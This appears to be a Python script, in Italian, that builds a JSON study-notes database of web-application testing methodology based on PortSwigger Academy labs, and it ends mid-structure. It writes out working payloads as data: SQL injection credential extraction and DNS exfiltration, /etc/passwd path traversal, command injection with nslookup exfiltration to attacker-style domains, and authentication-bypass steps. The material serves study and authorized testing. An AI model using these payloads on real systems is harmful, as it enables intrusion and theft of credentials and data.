#!/usr/bin/env python3
"""
Genera data/web_seed.json: la metodologia Web App come appunti di studio, con
tre livelli -> MACROcategoria (classe di vulnerabilita') -> MICROcategorie
(sezioni) -> test (con payload e processo da provare) e LAB (mini-sezioni che
documentano cosa e' stato fatto per risolvere un laboratorio PortSwigger).

Fonte: appunti personali su PortSwigger Web Security Academy.
I payload sono riferimenti di studio: usali solo su sistemi AUTORIZZATI.

Uso:  python tools/build_web.py
(poi il seed dell'app carica il JSON prodotto, in modo ADDITIVO per macrocategoria)
"""
import json
from pathlib import Path

PS = "https://portswigger.net/web-security"


def test(title, goal=None, payload=None, process=None, interpretation=None,
         tool=None, references=None):
    """Un test da fare: cosa verifichi, con quale payload e con quale processo."""
    return {"title": title, "goal": goal, "tool": tool, "payload": payload,
            "process": process, "interpretation": interpretation, "references": references}


def lab(title, process, payload=None, references=None):
    """Un lab risolto: mini-sezione con 'cosa e' stato fatto' (process) e il payload usato."""
    return {"title": title, "is_lab": True, "process": process,
            "payload": payload, "references": references}


def micro(name, description, checks, intro=None, references=None):
    """Una microcategoria (sezione) con i suoi test/lab."""
    return {"name": name, "description": description, "intro": intro,
            "references": references, "checks": checks}


def macro(name, description, intro, children, references=None, checks=None):
    """Una macrocategoria (classe di vulnerabilita') con le sue microcategorie."""
    return {"name": name, "description": description, "intro": intro,
            "references": references, "checks": checks or [], "children": children}


# ===========================================================================
#  1. SQL INJECTION
# ===========================================================================
SQL_INJECTION = macro(
    "SQL Injection",
    "Interferire con le query SQL dell'applicazione tramite input non filtrato.",
    (
        "L'SQL injection (SQLi) e' una vulnerabilita' che consente a un attaccante di "
        "interferire con le query che un'applicazione esegue sul proprio database. "
        "Puo' permettere di visualizzare dati che normalmente non sarebbero recuperabili "
        "(dati di altri utenti o qualunque dato dell'applicazione), e in alcuni casi di "
        "modificarli o cancellarli, alterando il comportamento dell'applicazione.\n\n"
        "Individuazione manuale: su ogni punto di ingresso prova in modo sistematico\n"
        "- l'apice singolo ' e cerca errori;\n"
        "- sintassi SQL che valuta il valore base del punto di ingresso vs un valore diverso;\n"
        "- condizioni booleane come OR 1=1 e OR 1=2, osservando le differenze nelle risposte;\n"
        "- payload che causano ritardi temporali quando eseguiti nella query;\n"
        "- payload OAST che generano un'interazione di rete fuori banda (verso un server controllato).\n\n"
        "Prevenzione: usare query parametrizzate (prepared statement) invece della "
        "concatenazione di stringhe, ovunque un input non attendibile appaia come dato "
        "nella query (clausola WHERE, valori di INSERT/UPDATE). Dove i parametri non sono "
        "utilizzabili (nomi di tabella/colonna, ORDER BY) usare una whitelist di valori ammessi.\n\n"
        "Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet"
    ),
    references=PS + "/sql-injection",
    children=[
        micro("Rilevare una SQL injection",
              "I test sistematici da provare su ogni punto di ingresso.", [
            test("Apice singolo",
                 goal="Primo indizio: rompere la sintassi della query.",
                 payload="'",
                 process="Inserisci un apice singolo nel punto di ingresso e cerca errori SQL o risposte anomale."),
            test("Condizioni booleane (OR 1=1 / OR 1=2)",
                 goal="Verificare se l'input influenza la logica della query.",
                 payload="' OR 1=1--\n' OR 1=2--",
                 process="Invia una condizione vera e una falsa e confronta le due risposte: se cambiano, la query e' influenzabile."),
            test("Ritardi temporali",
                 goal="Rilevare SQLi anche senza output visibile.",
                 payload="'; IF (1=1) WAITFOR DELAY '0:0:10'--",
                 process="Inietta un payload che ritarda la risposta solo se la query viene eseguita; misura il tempo di risposta."),
            test("Payload OAST (out-of-band)",
                 goal="Rilevare SQLi quando non c'e' alcuna differenza osservabile nella risposta.",
                 payload="'; exec master..xp_dirtree '//TUO-SOTTODOMINIO.burpcollaborator.net/a'--",
                 process="Genera un'interazione di rete (es. DNS) verso un sistema sotto il tuo controllo (Burp Collaborator) e verifica se arriva."),
        ]),
        micro("Esempi di base",
              "Gli usi tipici di una SQLi una volta individuata.", [
            test("Raggiungere dati nascosti",
                 goal="Rimuovere filtri della query per vedere dati non mostrati.",
                 payload="https://sito/products?category=Gifts'--",
                 process="Il -- commenta il resto della query: SELECT ... WHERE category = 'Gifts'--' AND released = 1 -> salta il filtro 'released = 1'."),
            test("Aggirare la logica di login",
                 goal="Autenticarsi come un utente senza conoscerne la password.",
                 payload="administrator'--",
                 process="Nel campo username: SELECT * FROM users WHERE username = 'administrator'--' AND password = '' -> il controllo password viene commentato."),
            test("Dati da altre tabelle (UNION)",
                 goal="Aggiungere i risultati di una seconda SELECT a quelli originali.",
                 payload="' UNION SELECT username, password FROM users--",
                 process="Usa UNION per eseguire una query aggiuntiva su un'altra tabella e accodarne i risultati.",
                 references=PS + "/sql-injection/union-attacks"),
        ]),
        micro("Esaminare il database",
              "Capire tipo/versione del DBMS ed elencarne tabelle e colonne.", [
            test("Tipo e versione del database",
                 goal="Identificare il DBMS per adattare i payload.",
                 payload=("-- Microsoft SQL Server / MySQL:\nSELECT @@version\n"
                          "-- Oracle:\nSELECT * FROM v$version\n"
                          "-- PostgreSQL:\nSELECT version()\n"
                          "-- via UNION:\n' UNION SELECT @@version--"),
                 process="Inietta la query specifica di ciascun DBMS e vedi quale funziona.",
                 interpretation="Su Oracle ogni SELECT richiede FROM: usa la tabella dual (es. UNION SELECT 'abc' FROM dual). In molti DBMS -- richiede uno spazio dopo; si puo' usare anche #."),
            test("Elencare le tabelle",
                 goal="Scoprire quali tabelle esistono.",
                 payload="SELECT * FROM information_schema.tables\n-- Oracle:\nSELECT * FROM all_tables",
                 process="La maggior parte dei DBMS espone l'information schema con l'elenco delle tabelle."),
            test("Elencare le colonne di una tabella",
                 goal="Scoprire le colonne (es. username, password).",
                 payload=("SELECT * FROM information_schema.columns WHERE table_name = 'Users'\n"
                          "-- Oracle:\nSELECT * FROM all_tab_columns WHERE table_name = 'USERS'"),
                 process="Interroga information_schema.columns filtrando per il nome della tabella trovata."),
        ]),
        micro("UNION attacks",
              "Recuperare dati da altre tabelle quando i risultati finiscono nella risposta.",
              intro=("UNION accoda i risultati di altre SELECT a quelli della query originale. "
                     "Perche' funzioni: stesso numero di colonne e tipi di dato compatibili tra le query."),
              references=PS + "/sql-injection/union-attacks",
              checks=[
            test("Numero di colonne con ORDER BY",
                 goal="Determinare quante colonne restituisce la query originale.",
                 payload="' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--",
                 process="Incrementa l'indice finche' non appare un errore: l'ultimo indice valido e' il numero di colonne."),
            test("Numero di colonne con UNION SELECT NULL",
                 goal="Metodo alternativo per contare le colonne.",
                 payload=("' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n"
                          "' UNION SELECT NULL,NULL,NULL--\n-- Oracle:\n' UNION SELECT NULL FROM DUAL--"),
                 process="Aumenta i NULL finche' l'errore sparisce: NULL e' compatibile con ogni tipo."),
            test("Trovare una colonna di tipo stringa",
                 goal="Individuare una colonna che puo' contenere testo (per esfiltrare stringhe).",
                 payload=("' UNION SELECT 'a',NULL,NULL,NULL--\n"
                          "' UNION SELECT NULL,'a',NULL,NULL--\n"
                          "' UNION SELECT NULL,NULL,'a',NULL--"),
                 process="Metti 'a' in una colonna alla volta: se il tipo non e' compatibile con una stringa, la query da' errore."),
            test("Recuperare dati interessanti",
                 goal="Estrarre i dati veri (es. credenziali).",
                 payload="' UNION SELECT username, password FROM users--",
                 process="Noto il numero di colonne e quali reggono stringhe, seleziona i campi utili dalla tabella bersaglio."),
            test("Piu' valori in una sola colonna",
                 goal="Esfiltrare piu' campi quando la query restituisce una sola colonna.",
                 payload="' UNION SELECT username || '~' || password FROM users--",
                 process="Concatena i valori con un separatore (su Oracle l'operatore e' ||)."),
        ]),
        micro("Blind SQL injection",
              "SQLi sfruttabile anche se risposta ed errori non mostrano i risultati.",
              references=PS + "/sql-injection/blind",
              checks=[
            test("Risposte condizionali (boolean-based)",
                 goal="Dedurre i dati un carattere alla volta dalle differenze di risposta.",
                 payload="xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm",
                 process="Inietta una condizione vera/falsa (es. su un cookie TrackingId) e osserva un marcatore come \"Welcome back\"; restringi carattere per carattere (SUBSTRING, chiamata SUBSTR in alcuni DBMS)."),
            test("Errori condizionali (error-based)",
                 goal="Usare la presenza/assenza di un errore come oracolo.",
                 payload="xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a",
                 process="Costruisci una query che va in errore (es. divisione per zero) solo se la condizione e' vera; osserva se compare un messaggio di errore."),
            test("Estrarre dati dai messaggi di errore",
                 goal="Leggere dati direttamente dentro un errore dettagliato.",
                 payload="CAST((SELECT example_column FROM example_table) AS int)",
                 process="Con CAST converti una stringa in un tipo incompatibile (es. int): l'errore mostra il valore, es. 'invalid input syntax for type integer: \"Example data\"'."),
            test("Ritardi temporali condizionali (time-based)",
                 goal="Usare il tempo di risposta come oracolo quando gli errori sono gestiti.",
                 payload="'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--",
                 process="La query ritarda solo se la condizione e' vera; misurando il tempo ricostruisci la password carattere per carattere."),
            test("Out-of-band (OAST) ed esfiltrazione DNS",
                 goal="Sfruttare la SQLi quando non c'e' alcun oracolo osservabile nella risposta.",
                 payload="'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree \"//'+@p+'.TUO-SOTTODOMINIO.burpcollaborator.net/a\"')--",
                 process="Provoca una richiesta DNS verso un sottodominio Collaborator univoco includendo nel nome il dato da esfiltrare; monitora le interazioni ricevute."),
        ]),
        micro("SQL injection in contesti diversi",
              "Input in JSON/XML e offuscamento per aggirare i WAF.", [
            test("Offuscare in XML per bypassare i WAF",
                 goal="Aggirare filtri che bloccano parole chiave SQL.",
                 payload="<stockCheck>\n  <productId>123</productId>\n  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>\n</stockCheck>",
                 process="Codifica i caratteri delle parole proibite (qui la 'S' di SELECT come &#x53;) per superare WAF e filtri basati su parole chiave."),
        ]),
    ],
)


# ===========================================================================
#  2. AUTHENTICATION
# ===========================================================================
AUTHENTICATION = macro(
    "Authentication",
    "Aggirare o forzare login, 2FA, reset e cambio password.",
    (
        "L'autenticazione verifica l'identita' di un utente. Tre tipi: qualcosa che conosci "
        "(password), qualcosa che possiedi (telefono/token), qualcosa che sei (biometria). "
        "E' diversa dall'autorizzazione (cosa un utente e' autorizzato a fare).\n\n"
        "Le vulnerabilita' nascono quando i meccanismi non proteggono dal brute-force, "
        "oppure quando errori logici permettono di aggirare del tutto l'autenticazione. "
        "Chi aggira l'autenticazione o entra nell'account altrui ne ottiene dati e funzioni, "
        "e nuove superfici d'attacco."
    ),
    references=PS + "/authentication",
    children=[
        micro("Login basati su password",
              "Brute-force, enumerazione utenti e protezioni difettose.",
              references=PS + "/authentication/password-based", checks=[
            test("Brute-force delle credenziali",
                 goal="Indovinare username/password validi per tentativi ed errori.",
                 tool="Burp Intruder / hydra",
                 process="Verifica se il sito espone nomi utente (pagine pubbliche, email nelle risposte HTTP anche di admin/support). Sfrutta il comportamento umano per le password ad alta entropia."),
            test("Username enumeration",
                 goal="Capire se un nome utente e' valido dalle differenze di comportamento.",
                 process="Su login/registrazione osserva differenze in: codici di stato, messaggi di errore, tempi di risposta. Costruisci cosi' una lista di username validi."),
            test("Protezioni brute-force difettose",
                 goal="Aggirare blocchi basati su IP o su numero di tentativi.",
                 process="Se il contatore si azzera dopo un login corretto, inserisci nella wordlist un tuo login valido ogni pochi tentativi. Se il blocco e' per IP, falsifica l'IP apparente."),
            lab("Lab: bypass del blocco per IP",
                process="Lab risolto aggiungendo l'header X-Forwarded-For per cambiare l'IP apparente e aggirare il rate-limit basato su IP.",
                payload="X-Forwarded-For: 1.2.3.4"),
            test("Blocco dell'account (account lockout)",
                 goal="Aggirare il lockout e sfruttarne le risposte per enumerare.",
                 process="Con limite di N tentativi: prendi molti username candidati e al massimo N password probabili; prova ogni password su tutti gli username (Intruder). Il lockout non protegge dal credential stuffing (ogni username provato una volta)."),
            test("Limitazione per utente: piu' password in una richiesta",
                 goal="Aggirare il rate-limit provando piu' password in una sola richiesta HTTP.",
                 process="Se il limite conta le richieste HTTP, cerca un modo per tentare piu' password all'interno di una singola richiesta."),
            lab("Lab: molte password in una sola richiesta",
                process="Lab risolto inserendo tutte le password in una sola richiesta POST, che conteneva la password in formato JSON (un array di valori)."),
            test("HTTP Basic authentication",
                 goal="Riconoscerne i rischi.",
                 process="Il token e' base64(username:password) nell'header Authorization, reinviato a ogni richiesta. Rischi: credenziali ripetute (senza HSTS), spesso nessuna protezione brute-force, nessuna protezione CSRF."),
        ]),
        micro("Autenticazione a più fattori (2FA)",
              "Bypass e logica difettosa del secondo fattore.",
              references=PS + "/authentication/multi-factor", checks=[
            test("Intercettazione del codice 2FA",
                 goal="Capire i limiti dei codici via SMS.",
                 process="I codici via SMS possono essere intercettati o ottenuti con SIM swapping (SIM fraudolenta associata al numero della vittima)."),
            test("Aggirare il 2FA (stato 'loggato' anticipato)",
                 goal="Saltare del tutto il secondo fattore.",
                 process="Se dopo la password l'utente e' gia' di fatto 'loggato', prova ad accedere direttamente alle pagine riservate senza inserire il codice: a volte il sito non verifica che il secondo passaggio sia stato completato."),
            test("Logica difettosa del 2FA",
                 goal="Completare il secondo fattore per conto di un altro utente.",
                 payload="POST /login-steps/second\nCookie: account=victim-user\nverification-code=123456",
                 process="Se un cookie (es. account=carlos) determina per quale account si invia il codice, cambialo con lo username della vittima al momento dell'invio."),
            lab("Lab: 2FA logic flaw",
                process="Lab risolto intercettando la GET che genera il codice e rifacendola cambiando il nome utente, poi brute-force del codice sulla POST cambiando il nome."),
            test("Brute-force dei codici 2FA",
                 goal="Forzare un codice di verifica a bassa entropia.",
                 process="Se il sito fa logout dopo troppi codici errati, automatizza il re-login tra un tentativo e l'altro (macro di Burp Intruder, oppure Turbo Intruder)."),
            lab("Lab: brute-force del codice 2FA",
                process="Lab risolto creando una macro che ripete il login, cosi' da tornare al form del 2FA prima di ogni tentativo di brute-force sul valore del codice."),
        ]),
        micro("Altri meccanismi (remember me, reset, cambio password)",
              "Funzioni correlate al login, spesso meno protette.",
              references=PS + "/authentication/other-mechanisms", checks=[
            test("Cookie 'remember me' prevedibile",
                 goal="Dedurre o forzare il cookie persistente di altri utenti.",
                 process="Se il cookie e' una concatenazione di valori statici (nome+timestamp, o la password), analizza il tuo per capirne la formula. Base64 non e' protezione; un hash senza salt si forza calcolando l'hash delle wordlist."),
            lab("Lab: cookie = nome:password-hashata",
                process="Lab risolto entrando con l'account, notando che il cookie e' nome:password-hashata, e facendo brute-force sulle password aggiungendo il passaggio di hashing in Payload Processing di Intruder."),
            lab("Lab: rubare il cookie remember-me via XSS",
                process="Lab risolto inserendo una stored XSS in un commento per rubare il cookie 'logged in' della vittima, poi decoding base64 e CrackStation per risalire alla password."),
            test("Reset della password via URL/token",
                 goal="Reimpostare la password di un altro utente.",
                 payload="http://sito/reset-password?user=victim-user",
                 process="Se l'URL identifica l'account con un parametro prevedibile (user=...), cambialo. Se il token non viene riverificato all'invio del form, apri il reset del tuo account, rimuovi il token e reimposta la password di un altro."),
            lab("Lab: password reset poisoning",
                process="Lab risolto aggiungendo l'header X-Forwarded-Host alla POST di reset e cambiando lo username: l'email arrivava alla vittima ma il link puntava al server exploit, catturando il token.",
                payload="X-Forwarded-Host: TUO-SERVER-EXPLOIT"),
            test("Cambio password",
                 goal="Sfruttare campi nascosti o la verifica della password attuale.",
                 process="Se lo username e' in un campo nascosto, modificalo per colpire altri utenti. La pagina verifica la password attuale come un login: puo' essere brute-forzabile."),
            lab("Lab: brute-force della password attuale al cambio",
                process="Lab risolto intercettando la POST di cambio password, cambiando user e mettendo due nuove password DIVERSE: nel brute-force sul campo 'password attuale', quella giusta da' l'errore 'le due nuove password non coincidono' (le altre danno 'password attuale errata'), rivelando la password corrente."),
        ]),
    ],
)


# ===========================================================================
#  3. PATH TRAVERSAL
# ===========================================================================
PATH_TRAVERSAL = macro(
    "Path Traversal",
    "Leggere file arbitrari sul server uscendo dalla directory prevista.",
    (
        "Il Path Traversal (o Directory Traversal) consente di leggere file arbitrari sul "
        "server. Tipico nei parametri che indicano un file (es. ?filename=218.png), quando "
        "l'input finisce in un'API del filesystem senza validazione.\n\n"
        "Prevenzione: evitare di passare input dell'utente alle API del filesystem. Se "
        "inevitabile, validare con una whitelist (o almeno solo caratteri alfanumerici), poi "
        "concatenare alla directory base, risolvere il percorso canonico e verificare che "
        "inizi con la directory base prevista."
    ),
    references=PS + "/file-path-traversal",
    children=[
        micro("Lettura di file arbitrari", "Il traversal di base, su Linux e Windows.", [
            test("Traversal di base",
                 goal="Leggere un file fuori dalla directory prevista.",
                 payload="../../../etc/passwd\n-- Windows (sia ../ che ..\\):\n..\\..\\..\\windows\\win.ini",
                 process="Nel parametro che indica il file (es. ?filename=) risali le directory con ../ fino al file voluto."),
            lab("Lab: lettura via path traversal",
                process="Lab risolti con path traversal sulla richiesta dell'immagine, e con doppio ../ dove la sequenza veniva filtrata."),
        ]),
        micro("Aggirare i filtri", "Quando le sequenze ../ vengono rimosse o bloccate.", [
            test("Percorso assoluto",
                 goal="Evitare del tutto le sequenze ../.",
                 payload="filename=/etc/passwd",
                 process="Se il filtro rimuove ../, usa un percorso assoluto dalla radice del filesystem."),
            test("Sequenze di traversal annidate",
                 goal="Sopravvivere a un filtro che rimuove ../ una sola volta.",
                 payload="....//\n....\\/",
                 process="Quando il filtro toglie la parte interna, ....// torna a essere ../."),
            test("URL encoding e doppio encoding",
                 goal="Aggirare una sanitizzazione che agisce prima dell'applicazione.",
                 payload="../  ->  %2e%2e%2f\n../  ->  %252e%252e%252f (doppio)\nnon standard:  ..%c0%af   ..%ef%bc%8f",
                 process="Codifica i ../ via URL/doppio URL encoding. In Burp Pro c'e' la lista 'Fuzzing - path traversal'."),
            lab("Lab: bypass con doppio URL encoding",
                process="Risolto con encoding: GET /image?filename=..%252f..%252f..%252fetc/passwd"),
            test("Directory base obbligatoria",
                 goal="Quando il file deve iniziare con la directory base prevista.",
                 payload="filename=/var/www/images/../../../etc/passwd",
                 process="Includi la directory base richiesta e poi risali con ../."),
            lab("Lab: directory base + traversal",
                process="Lab risolto con GET /image?filename=/var/www/images/../../../etc/passwd"),
            test("Estensione obbligatoria (null byte)",
                 goal="Quando il nome deve terminare con un'estensione (.png).",
                 payload="filename=../../../etc/passwd%00.png",
                 process="Il null byte %00 termina il percorso prima dell'estensione: implementazioni vulnerabili ignorano cio' che segue."),
            lab("Lab: null byte",
                process="Lab risolto con GET /image?filename=../../../etc/passwd%00.jpg"),
        ]),
    ],
)


# ===========================================================================
#  4. OS COMMAND INJECTION
# ===========================================================================
OS_COMMAND_INJECTION = macro(
    "OS Command Injection",
    "Eseguire comandi del sistema operativo sul server (shell injection).",
    (
        "L'OS Command Injection (Shell Injection) consente di eseguire comandi del sistema "
        "operativo sul server. Nasce quando l'input dell'utente finisce come argomento di un "
        "comando di shell (es. stockreport.pl <productID> <storeID>).\n\n"
        "Prevenzione: non eseguire comandi di shell dal codice (usare API della piattaforma). "
        "Se inevitabile, validazione rigorosa dell'input."
    ),
    references=PS + "/os-command-injection",
    children=[
        micro("Iniettare comandi", "Rilevare ed eseguire comandi concatenandoli.", [
            test("Rilevare con echo / separatori",
                 goal="Confermare l'iniezione eseguendo un comando aggiuntivo.",
                 payload="& echo aiwefwlguh &\n| whoami",
                 process="& separa i comandi: l'output di echo nella risposta conferma l'iniezione. Un & dopo il payload lo separa dal testo che segue, cosi' non rompe l'esecuzione."),
            lab("Lab: OS command injection semplice",
                process="Lab risolto con productId=1|whoami&storeId=1"),
            test("Comandi utili per orientarsi",
                 goal="Capire dove sei una volta ottenuta l'esecuzione.",
                 payload=("utente corrente:  whoami\n"
                          "sistema operativo:  uname -a   (Windows: ver)\n"
                          "rete:  ifconfig   (Windows: ipconfig /all)\n"
                          "connessioni:  netstat -an\n"
                          "processi:  ps -ef   (Windows: tasklist)")),
        ]),
        micro("Blind OS command injection", "Quando l'output non torna nella risposta.", [
            test("Ritardi temporali",
                 goal="Confermare l'esecuzione dal tempo di risposta.",
                 payload="& ping -c 10 127.0.0.1 &",
                 process="ping con numero di pacchetti controlla la durata: ~10s di ritardo confermano l'esecuzione."),
            lab("Lab: blind con sleep",
                process="Lab risolto inserendo gian@a.com;sleep 10; nel parametro email tramite inspector in Repeater, cosi' lo encodi automaticamente."),
            test("Reindirizzare l'output in un file nella web root",
                 goal="Leggere l'output recuperando un file dal browser.",
                 payload="& whoami > /var/www/static/whoami.txt &",
                 process="> scrive l'output in un file servito staticamente; poi apri https://sito/whoami.txt."),
            lab("Lab: output redirection",
                process="Lab superato inserendo gian@a.com;whoami > /www/images/whoami.txt; in Intruder e aprendo poi la richiesta dell'immagine puntata a whoami.txt."),
            test("Out-of-band (OAST) ed esfiltrazione DNS",
                 goal="Confermare ed esfiltrare quando non c'e' output ne' ritardo utile.",
                 payload="& nslookup kgji2ohoyw.web-attacker.com &\n-- esfiltrazione:\n& nslookup `whoami`.kgji2ohoyw.web-attacker.com &",
                 process="nslookup genera una richiesta DNS verso un dominio controllato; i backtick `whoami` eseguono il comando e ne mettono l'output nel sottodominio."),
            lab("Lab: OAST con nslookup",
                process="Lab superato con prova@prova.it; nslookup <SOTTODOMINIO>.oastify.com; e, per l'esfiltrazione, prova@prova.it; nslookup `whoami`.<SOTTODOMINIO>.oastify.com;"),
        ]),
        micro("Metacaratteri e separatori", "Come iniettare a seconda del contesto.", [
            test("Separatori di comando",
                 goal="Concatenare comandi secondo il sistema operativo.",
                 payload=("Windows e Unix:  &   &&   |   ||\n"
                          "Solo Unix:  ;   e la nuova riga (0x0a, \\n)\n"
                          "Unix, comando dentro comando:  `comando`   $(comando)"),
                 process="Se l'input e' dentro virgolette nel comando originale, chiudi prima il contesto con \" o ' e poi inietta."),
        ]),
    ],
)


# ===========================================================================
#  5. BUSINESS LOGIC
# ===========================================================================
BUSINESS_LOGIC = macro(
    "Business Logic",
    "Difetti logici nel flusso dell'applicazione che portano a comportamenti non previsti.",
    (
        "Le vulnerabilita' di business logic sono difetti di progettazione/implementazione "
        "che consentono comportamenti non previsti: aggirare le regole di business (es. "
        "completare una transazione saltando il flusso previsto) o fornire valori inattesi "
        "alla logica lato server.\n\n"
        "Per trovarle bisogna capire il dominio dell'applicazione ed evitare le ipotesi "
        "implicite sul comportamento di utenti e componenti. Strumenti chiave: Burp Proxy e "
        "Repeater per inviare valori che un utente legittimo non invierebbe mai."
    ),
    references=PS + "/logic-flaws",
    children=[
        micro("Eccessiva fiducia nei controlli lato client",
              "I controlli del browser si aggirano modificando la richiesta.", [
            test("Modificare i dati dopo il browser",
                 goal="Bypassare validazioni fatte solo lato client.",
                 payload="POST /cart ... price=10   (al posto di price=10000)",
                 process="Con Burp Proxy modifica i dati dopo l'invio dal browser ma prima dell'elaborazione lato server: i controlli client diventano inutili."),
            lab("Lab: prezzo modificato nel carrello",
                process="Lab risolto modificando la POST che aggiunge l'elemento al carrello, con il campo price ridotto da 10000 a 10."),
        ]),
        micro("Mancata gestione di input non convenzionali",
              "Valori che un utente normale non invierebbe: negativi, enormi, tipi inattesi.", [
            test("Valori fuori range (anche negativi)",
                 goal="Rompere limiti numerici della logica.",
                 payload="amount=-1000",
                 process="Prova numeri enormi, bassissimi o negativi, stringhe lunghe, tipi inattesi. Es. un trasferimento di -1000 supera sempre il controllo 'importo <= saldo' e inverte la direzione."),
            lab("Lab: azzerare il prezzo con quantita' negativa",
                process="Lab risolto modificando la POST di aggiunta al carrello: aggiunto l'item da 1000 e aggiunti -10 item da 10 per azzerare il totale."),
            lab("Lab: overflow della quantita'",
                process="Lab risolto aggiungendo l'item con Intruder impostando la quantita' a 99 (loopback a un numero negativo), poi un altro item per riportare il totale tra 0 e 100 e fare checkout."),
            lab("Lab: troncamento dell'email a 255 caratteri",
                process="Lab risolto: /admin e' riservato alle email @dontwannacry.com e il sito tronca le email a 255 caratteri. Registri stringa_lunga@dontwannacry.com.TUO-DOMINIO facendo finire @dontwannacry.com al 255° carattere: il sistema salva l'email troncata @dontwannacry.com e concede l'accesso ad /admin."),
        ]),
        micro("Supposizioni errate sul comportamento degli utenti",
              "Utenti che non restano fidati, omettono parametri o saltano i passaggi.", [
            test("Gli utenti fidati non restano fidati",
                 goal="Sfruttare la fiducia concessa dopo i controlli iniziali.",
                 process="Se l'app considera affidabili per sempre utente e dati dopo i controlli iniziali, modifica un dato sensibile (es. l'email del dominio riservato) dopo la registrazione."),
            lab("Lab: cambio email dopo la registrazione",
                process="Lab risolto: con Burp > Discover content trovi /admin (riservato a DontWannaCry). Ti registri con un'email del dominio fornito, confermi, poi in My account cambi l'email in una @dontwannacry.com e accedi ad /admin."),
            test("Parametri obbligatori rimossi",
                 goal="Raggiungere percorsi di codice saltando input 'obbligatori'.",
                 process="Rimuovi un parametro alla volta (sia il nome sia il valore, gestiti spesso diversamente), anche nei processi multi-fase. Vale per URL, POST e anche cookie."),
            lab("Lab: rimozione di current-password",
                process="Lab risolto togliendo il campo current-password e cambiando username ad administrator nella richiesta di cambio password (csrf=...&username=wiener&new-password-1=ciao&new-password-2=ciao)."),
            test("Sequenza dei passaggi non rispettata",
                 goal="Aggirare workflow multi-step con forced browsing.",
                 process="Con il forced browsing invia le richieste in ordine non previsto: salta passaggi, ripetili, torna indietro. Spesso basta una GET/POST a un URL, a volte servono combinazioni di parametri."),
            lab("Lab: riconferma dell'ordine",
                process="Lab risolto: salvata la GET /cart/order-confirmation?order-confirmation=true in Repeater, aggiungi al carrello l'articolo costoso e reinvii la conferma: l'ordine si completa senza che il costo venga detratto dal credito."),
        ]),
        micro("Difetti specifici del dominio applicativo",
              "Sconti, prezzi e valori che cambiano in base alle azioni dell'utente.", [
            test("Manipolare prezzi/sconti",
                 goal="Portare l'app in uno stato dove gli aggiustamenti non seguono piu' i criteri previsti.",
                 process="Capisci quando e con quale algoritmo vengono applicati sconti/aggiustamenti, poi manipola l'ordine delle azioni per sfruttarli."),
            lab("Lab: coupon alternati",
                process="Lab risolto alternando due codici coupon: lo stesso codice due volte di fila viene rifiutato ('gia' applicato'), ma alternandoli si aggira il controllo e si riduce il totale sotto il credito disponibile."),
            lab("Lab: ciclo delle gift card",
                process="Lab risolto sfruttando un ciclo: coupon SIGNUP30, compri una gift card da $10 pagandola $7, la riscatti per $10 di credito ($3 netti a ciclo). Automatizzato con una macro Burp che estrae il codice gift card dalla risposta e lo riscatta, guidata da Intruder (Null Payloads) fino a generare credito a sufficienza."),
        ]),
        micro("Encryption oracle e parser email",
              "Due casi logici particolari.", [
            test("Encryption oracle",
                 goal="Usare una funzione che cifra input utente per forgiare dati cifrati validi.",
                 process="Se un input controllabile viene cifrato e il cifrato e' restituito all'utente, e altrove l'app accetta dati cifrati con lo stesso algoritmo, usa l'oracolo per generare input cifrati validi (ancora meglio se esiste anche una funzione di decifratura)."),
            test("Discrepanze nel parser degli indirizzi email",
                 goal="Registrare account su domini riservati con email ambigue.",
                 payload="attacker@TUO-DOMINIO.it(@azienda-riservata.com)   # esempi di encoding/commenti RFC",
                 process="Sfrutta il parsing diverso dell'email tra validazione e logica: con encoding mascheri parti dell'indirizzo per superare i controlli ma farlo interpretare come dominio riservato (accesso ad aree sensibili)."),
        ]),
    ],
)


# ===========================================================================
#  6. INFORMATION DISCLOSURE
# ===========================================================================
INFORMATION_DISCLOSURE = macro(
    "Information Disclosure",
    "Il sito rivela involontariamente dati sensibili, tecnici o di altri utenti.",
    (
        "La divulgazione di informazioni e' quando un sito rivela involontariamente: dati di "
        "altri utenti, dati aziendali sensibili, o dettagli tecnici su sito e infrastruttura. "
        "La gravita' dipende da come un attaccante puo' sfruttarli (sapere la versione di un "
        "framework aggiornato vale poco).\n\n"
        "Prevenzione: messaggi di errore generici, disabilitare debug/diagnostica in "
        "produzione, revisione in QA, consapevolezza di cosa e' sensibile."
    ),
    references=PS + "/information-disclosure",
    children=[
        micro("Come testare", "Strumenti e tecniche per far emergere informazioni.", [
            test("Fuzzing dei parametri",
                 goal="Provocare comportamenti o errori rivelatori.",
                 process="Su parametri interessanti invia tipi di dato inattesi e stringhe di fuzzing (Burp Intruder). L'estensione Logger++ aiuta a filtrare le risposte piu' interessanti."),
            test("Burp Scanner ed Engagement tools",
                 goal="Trovare rapidamente contenuti e indizi.",
                 process="Usa Burp Scanner (Pro) e gli Engagement tools dal menu contestuale: Search (anche regex), Find comments, Discover content (file/dir non linkati)."),
            test("Messaggi di errore dettagliati",
                 goal="Leggere informazioni dagli errori.",
                 process="Presta attenzione a ogni messaggio di errore durante l'auditing: spesso rivela versioni, percorsi, nomi di tabelle/colonne."),
        ]),
        micro("Fonti comuni di divulgazione", "Dove guardare per primo.", [
            test("File per i web crawler",
                 goal="Scoprire percorsi sensibili elencati per i crawler.",
                 payload="/robots.txt\n/sitemap.xml",
                 process="Spesso elencano directory che i crawler dovrebbero evitare (quindi interessanti)."),
            test("Directory listing",
                 goal="Elencare le risorse di un percorso senza pagina index.",
                 process="Server mal configurati mostrano il contenuto delle directory prive di index."),
            test("Commenti degli sviluppatori",
                 goal="Trovare commenti HTML lasciati in produzione.",
                 process="Cerca nei commenti del markup (Find comments) percorsi, note o credenziali dimenticate."),
            test("Messaggi di errore (fingerprint)",
                 goal="Capire lo stack dai dettagli dell'errore.",
                 payload="GET /product?productId=a   (tipo di dato inatteso)",
                 process="Un tipo di dato inatteso puo' generare uno stack trace che rivela framework e versione."),
            lab("Lab: versione da stack trace",
